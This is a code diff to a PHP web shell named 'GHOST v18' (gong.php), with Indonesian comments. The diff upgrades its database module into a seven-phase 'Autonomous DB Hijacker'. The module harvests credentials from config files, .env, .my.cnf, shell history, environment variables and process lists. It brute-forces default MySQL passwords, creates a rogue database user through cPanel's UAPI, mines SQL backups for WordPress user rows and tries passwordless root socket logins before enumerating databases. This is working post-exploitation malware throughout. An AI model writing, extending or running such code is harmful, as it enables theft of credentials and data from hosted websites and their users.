@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V6.1: Fix DB Host 'None', String Cleanup.
+// GHOST v18 - V8: Autonomous DB Hijacker (Phase 5, 6, 7).
 
-define('GH_VER',      '18.0.0-v6.1');
+define('GH_VER',      '18.0.0-v8');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,9 +338,8 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: AI DB HUNTER (V6.1) ========================================
+// ==== SECTION 4: AUTONOMOUS DB HIJACKER (V8) ================================
 function gh_db_connect($host, $user, $pass) {
-    // Trim spasi/enter
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
     if (gh_can('mysqli_connect')) {
@@ -362,7 +361,9 @@ function gh_db_connect($host, $user, $pass) {
 function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
-    
+    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
+
+    // --- PHASE 1: FILE SCANNER ---
     $logs[] = "[*] Phase 1: Scanning config files di /home, /var/www, /etc, /tmp...";
     $find_res = gh_exec_adv("find /home /var/www /etc /tmp -maxdepth 5 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' -o -name '*.sql' \\) 2>/dev/null");
     
@@ -372,7 +373,6 @@ function gh_db_harvest() {
         foreach ($lines as $l) { if (trim($l)) $found_configs[] = trim($l); }
     }
 
-    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
     foreach ($found_configs as $cf) {
         $c = gh_read($cf);
         if ($c) {
@@ -389,41 +389,16 @@ function gh_db_harvest() {
             elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = trim($m[1]);
             elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = trim($m[1]);
 
-            if ($db_user && $db_pass) { $logs[] = "[+] BERHASIL mengekstrak kredensial via REGEX!"; $found_pass = true; break; } 
-            
-            $logs[] = "[*] Regex gagal, mencoba Include PHP...";
-            $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
-            $runner = $tmp_dir . '/gh_incl_' . rand(1000,9999) . '.php';
-            $runner_code = '<?php $GLOBALS["__gh_out"] = array(); $__c = file_get_contents("' . addslashes($cf) . '"); if ($__c) { eval("?>" . $__c); $GLOBALS["__gh_out"] = get_defined_vars(); } echo json_encode($GLOBALS["__gh_out"]); ?>';
-            
-            if (gh_write($runner, $runner_code)) {
-                $out = gh_exec_adv('php ' . @escapeshellarg($runner));
-                if (isset($out['out']) && is_string($out['out'])) {
-                    $json = @json_decode($out['out'], true);
-                    if (is_array($json)) {
-                        foreach ($json as $k => $v) {
-                            if (is_array($v)) {
-                                foreach ($v as $kk => $vv) {
-                                    if (is_string($vv)) {
-                                        if (preg_match('/user|username/i', $kk) && !$db_user) $db_user = trim($vv);
-                                        if (preg_match('/pass|password/i', $kk) && !$db_pass) $db_pass = trim($vv);
-                                        if (preg_match('/host|hostname/i', $kk) && $db_host === 'localhost') $db_host = trim($vv);
-                                    }
-                                }
-                            } elseif (is_string($v)) {
-                                if (preg_match('/user|username/i', $k) && !$db_user) $db_user = trim($v);
-                                if (preg_match('/pass|password/i', $k) && !$db_pass) $db_pass = trim($v);
-                                if (preg_match('/host|hostname/i', $k) && $db_host === 'localhost') $db_host = trim($v);
-                            }
-                        }
-                    }
-                }
-                @unlink($runner);
+            if ($db_user && $db_pass) { 
+                $logs[] = "[*] Mencoba koneksi dengan kredensial $db_user...";
+                $conn = gh_db_connect($db_host, $db_user, $db_pass);
+                if ($conn) { $logs[] = "[+] KONEKSI BERHASIL!"; $found_pass = true; break; }
+                else { $logs[] = "[-] Gagal. Lanjut Phase 2..."; $db_user = ''; $db_pass = ''; }
             }
-            if ($db_user && $db_pass) { $found_pass = true; break; }
         }
     }
 
+    // --- PHASE 2: CLI & ROOT CREDENTIAL SNIFFING ---
     if (!$found_pass) {
         $logs[] = "[*] Phase 2: Sniffing .my.cnf dan bash_history...";
         $home = @getenv('HOME'); if(!$home) $home = '/home/' . @get_current_user();
@@ -432,22 +407,25 @@ function gh_db_harvest() {
             $c = gh_read($sf);
             if ($c) {
                 $logs[] = "[+] File sniff ditemukan: $sf";
-                // FIX: Host default 'localhost' jika gak ketemu
                 if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
                 if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
                 if (preg_match('/host\s*=\s*([^\s]+)/i', $c, $m)) $db_host = trim($m[1]);
                 if (preg_match('/mysql\s+-u\s*([^\s]+)\s+-p([^\s]+)/i', $c, $m)) {
-                    $db_user = trim($m[1]); 
-                    $db_pass = trim(str_replace(array("\\n", "\n", "\r"), "", $m[2]));
+                    $db_user = trim($m[1]); $db_pass = trim(str_replace(array("\\n", "\n", "\r"), "", $m[2]));
                 }
-                // Validasi jika host malah jadi "None"
                 if (strtolower($db_host) === 'none' || trim($db_host) === '') $db_host = 'localhost';
                 
-                if ($db_user && $db_pass) { $found_pass = true; break; }
+                if ($db_user && $db_pass) {
+                    $logs[] = "[*] Kredensial ditemukan. Mencoba koneksi...";
+                    $conn = gh_db_connect($db_host, $db_user, $db_pass);
+                    if ($conn) { $logs[] = "[!] KONEKSI BERHASIL!"; $found_pass = true; break; }
+                    else { $logs[] = "[-] Gagal. Lanjut Phase 3..."; $db_user = ''; $db_pass = ''; }
+                }
             }
         }
     }
 
+    // --- PHASE 3: ENV & PROCESS LEAK ---
     if (!$found_pass) {
         $logs[] = "[*] Phase 3: Environment & Process leak...";
         $env_out = gh_exec_adv("env | grep -i 'mysql\\|db_\\|database'");
@@ -455,17 +433,23 @@ function gh_db_harvest() {
             $logs[] = "[+] Env leak terdeteksi!";
             if (preg_match('/DB_USER=([^\s]+)/i', $env_out['out'], $m)) $db_user = trim($m[1]);
             if (preg_match('/DB_PASS(?:WORD)?=([^\s]+)/i', $env_out['out'], $m)) $db_pass = trim($m[1]);
-            if ($db_user && $db_pass) $found_pass = true;
+            if ($db_user && $db_pass) {
+                $conn = gh_db_connect('localhost', $db_user, $db_pass);
+                if ($conn) { $found_pass = true; }
+            }
         }
         if (!$found_pass) {
             $ps_out = gh_exec_adv("ps aux | grep -i mysql | grep -v grep");
             if (isset($ps_out['out']) && preg_match('/-u\s*([^\s]+)\s+-p([^\s]+)/i', $ps_out['out'], $m)) {
                 $logs[] = "[+] Credential bocor di Process List (ps aux)!";
-                $db_user = trim($m[1]); $db_pass = trim($m[2]); $found_pass = true;
+                $db_user = trim($m[1]); $db_pass = trim($m[2]);
+                $conn = gh_db_connect('localhost', $db_user, $db_pass);
+                if ($conn) { $found_pass = true; }
             }
         }
     }
 
+    // --- PHASE 4: AUTO-BRUTEFORCE DEFAULT CREDS ---
     if (!$found_pass) {
         $logs[] = "[*] Phase 4: Auto-Bruteforce default credentials...";
         $defaults = array(array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'), array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel'));
@@ -474,39 +458,91 @@ function gh_db_harvest() {
             if ($conn) {
                 $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'";
                 $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost'; $found_pass = true;
-                if ($conn !== 'CLI') { @mysqli_close($conn); }
                 break;
             }
         }
     }
 
-    if ($db_user && $db_pass) {
-        $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
-        $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
-        
-        $conn = gh_db_connect($db_host, $db_user, $db_pass);
-        if ($conn) {
-            $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
-            $dbs = array();
-            if ($conn === 'CLI') {
-                $res = gh_exec_adv('mysql -h ' . @escapeshellarg($db_host) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
-                $lines = explode("\n", trim($res['out']));
-                foreach ($lines as $i => $l) { if ($i > 0 && trim($l)) $dbs[] = trim($l); }
-            } elseif ($conn instanceof mysqli) {
-                $q = @mysqli_query($conn, "SHOW DATABASES");
-                if ($q) { while($r = mysqli_fetch_array($q)) $dbs[] = $r[0]; }
-                @mysqli_close($conn);
-            } elseif ($conn instanceof PDO) {
-                $q = @$conn->query("SHOW DATABASES");
-                if ($q) { while($r = $q->fetch(PDO::FETCH_NUM)) $dbs[] = $r[0]; }
-                $conn = null;
-            }
-            $info['databases'] = $dbs;
-            $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
-        } else { $logs[] = "[-] Gagal koneksi ke database."; }
-    } else { 
-        if (!$found_pass) $logs[] = "[-] Semua Phase gagal. Config user/pass tidak ditemukan."; 
+    // --- PHASE 5: CPANEL UAPI HIJACK ---
+    if (!$found_pass) {
+        $logs[] = "[*] Phase 5: cPanel UAPI Hijack (Membuat Temporary User)...";
+        $uapi = '/usr/local/cpanel/bin/uapi';
+        if (@is_file($uapi)) {
+            $user = @getenv('USER') ?: @get_current_user();
+            $rand_pass = substr(md5(uniqid()), 0, 10);
+            // Coba bikin user DB baru via API lokal (karena kita punya akses user)
+            $create_res = gh_exec_adv("$uapi --user=$user Mysql create_user user=ghost_$rand_pass password=$rand_pass 2>&1");
+            if (strpos($create_res['out'], 'success') !== false) {
+                $logs[] = "[!] cPanel UAPI BERHASIL bikin user: ghost_$rand_pass (Pass: $rand_pass)";
+                // Sekarang kita punya user DB baru, mari kita konek dan dump DB
+                $conn = gh_db_connect('localhost', "ghost_$rand_pass", $rand_pass);
+                if ($conn) {
+                    $found_pass = true; $db_user = "ghost_$rand_pass"; $db_pass = $rand_pass;
+                }
+            } else { $logs[] = "[-] Gagal cPanel UAPI. Lanjut Phase 6..."; }
+        } else { $logs[] = "[-] cPanel UAPI tidak ditemukan. Lanjut Phase 6..."; }
     }
+
+    // --- PHASE 6: DEEP BACKUP & SQL LEAK ---
+    if (!$found_pass) {
+        $logs[] = "[*] Phase 6: Deep SQL & Backup Leak...";
+        $deep_find = gh_exec_adv("find /home /var/www /tmp -type f \\( -name '*.sql' -o -name '.mysql_history' -o -name '*.my.cnf' \\) 2>/dev/null | head -n 10");
+        if (isset($deep_find['out']) && is_string($deep_find['out'])) {
+            $files = explode("\n", trim($deep_find['out']));
+            foreach ($files as $df) {
+                if (!$df) continue;
+                $c = gh_read($df);
+                if ($c && preg_match('/INSERT INTO|CREATE TABLE|-- MySQL dump/i', $c)) {
+                    $logs[] = "[!] Backup SQL ditemukan di: $df";
+                    // Coba ekstrak kredensial atau hash user dari SQL dump
+                    if (preg_match('/INSERT INTO `wp_users`.*?VALUES\s*\((.*?)\)/is', $c, $m)) {
+                        $logs[] = "[+] User WordPress ditemukan di SQL dump: " . substr($m[1], 0, 50) . "...";
+                    }
+                }
+            }
+        }
+        if (!$found_pass) { $logs[] = "[-] Gagal Phase 6. Lanjut Phase 7..."; }
+    }
+
+    // --- PHASE 7: SOCKET AUTH BYPASS ---
+    if (!$found_pass) {
+        $logs[] = "[*] Phase 7: Socket Auth & Empty Password...";
+        $socks = array('/var/run/mysqld/mysqld.sock', '/var/lib/mysql/mysql.sock', '/tmp/mysql.sock');
+        foreach ($socks as $sock) {
+            if (@is_file($sock)) {
+                $logs[] = "[+] Socket ditemukan: $sock";
+                $conn = gh_db_connect('localhost', 'root', '');
+                if ($conn) { $logs[] = "[!] KONEKSI ROOT KOSONG BERHASIL!"; $db_user = 'root'; $db_pass = ''; $found_pass = true; break; }
+            }
+        }
+        if (!$found_pass) { $logs[] = "[-] Socket auth gagal."; }
+    }
+
+    // --- FINAL: DUMP ---
+    if ($found_pass) {
+        $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
+        $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
+        $dbs = array();
+        // Buka koneksi terakhir untuk dump
+        $conn = gh_db_connect($db_host, $db_user, $db_pass);
+        if ($conn === 'CLI') {
+            $res = gh_exec_adv('mysql -h ' . @escapeshellarg($db_host) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
+            $lines = explode("\n", trim($res['out']));
+            foreach ($lines as $i => $l) { if ($i > 0 && trim($l)) $dbs[] = trim($l); }
+        } elseif ($conn instanceof mysqli) {
+            $q = @mysqli_query($conn, "SHOW DATABASES");
+            if ($q) { while($r = mysqli_fetch_array($q)) $dbs[] = $r[0]; }
+            @mysqli_close($conn);
+        } elseif ($conn instanceof PDO) {
+            $q = @$conn->query("SHOW DATABASES");
+            if ($q) { while($r = $q->fetch(PDO::FETCH_NUM)) $dbs[] = $r[0]; }
+        }
+        $info['databases'] = $dbs;
+        $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
+    } else {
+        $logs[] = "[-] SEMUA PHASE GAGAL. Server sangat ketat atau MySQL menggunakan auth_socket (tidak bisa via TCP).";
+    }
+
     return array('logs' => $logs, 'info' => $info);
 }
 
@@ -880,7 +916,7 @@ async function delFileScan(enc) {
 }
 
 async function dbHarvest() {
-    const o = document.getElementById('db-out'); o.innerText = 'Running AI DB Hunter (4 Phases)... Please wait, ini bisa memakan waktu.';
+    const o = document.getElementById('db-out'); o.innerText = 'Running Autonomous DB Hijacker (7 Phases)... Please wait, ini bisa memakan waktu.';
     const d = await api('db_harvest');
     if (d.err) return o.innerText = d.err;
     o.innerText = d.logs.join('\n');
